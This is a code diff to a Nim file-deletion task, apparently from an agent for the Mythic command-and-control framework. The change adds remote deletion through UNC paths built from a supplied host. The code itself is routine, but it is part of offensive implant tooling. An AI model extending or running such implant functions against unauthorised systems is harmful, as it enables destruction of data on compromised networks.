@@ -1,7 +1,7 @@
 ## Remove file or directory task
 ## Deletes files or directories from the filesystem
 
-import std/[json, os, strformat]
+import std/[json, os, strformat, strutils]
 import ../config
 import ../utils/mythic_responses
 
@@ -11,7 +11,19 @@ proc rm*(taskId: string, params: JsonNode): JsonNode =
   
   try:
     # Parse parameters
-    let path = params["path"].getStr()
+    let pathParam = params["path"].getStr()
+    let host = if params.hasKey("host"): params["host"].getStr() else: ""
+    
+    # Build UNC path if host is provided
+    let path = if host.len > 0:
+      # Remove leading/trailing backslashes from path
+      let cleanPath = pathParam.strip(chars = {'\\', '/'})
+      # Build UNC path: \\host\share
+      "\\\\" & host & "\\" & cleanPath
+    elif pathParam.startsWith("\\\\") or isAbsolute(pathParam):
+      pathParam
+    else:
+      getCurrentDir() / pathParam
     
     if cfg.debug:
       echo &"[DEBUG] Removing: {path}"
